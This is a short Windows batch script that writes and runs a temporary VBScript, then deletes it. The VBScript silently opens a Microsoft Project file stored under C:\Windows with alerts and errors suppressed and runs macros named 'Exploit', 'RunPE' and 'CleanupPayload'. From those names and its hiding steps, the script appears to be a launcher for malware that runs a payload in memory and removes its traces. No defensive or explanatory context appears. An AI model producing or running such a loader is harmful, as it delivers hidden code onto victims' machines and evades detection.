@echo off

setlocal



REM Path to your Project file

set "PROJECT_FILE=C:\Windows\Deployment.mpp"



REM Temporary VBS file

set "TEMP_VBS=%TEMP%\Deployment.vbs"



(

echo On Error Resume Next

echo Set pj = CreateObject("MSProject.Application"^)

echo pj.Visible = False

echo pj.DisplayAlerts = False

echo pj.FileOpen "%PROJECT_FILE%"

echo WScript.Sleep 1000

echo pj.Run "Exploit" 

echo pj.Run "RunPE" 

echo pj.Run "CleanupPayload" 

echo pj.FileClose

echo pj.Quit

echo Set pj = Nothing

) > "%TEMP_VBS%"



cscript //nologo "%TEMP_VBS%"



del "%TEMP_VBS%"



endlocal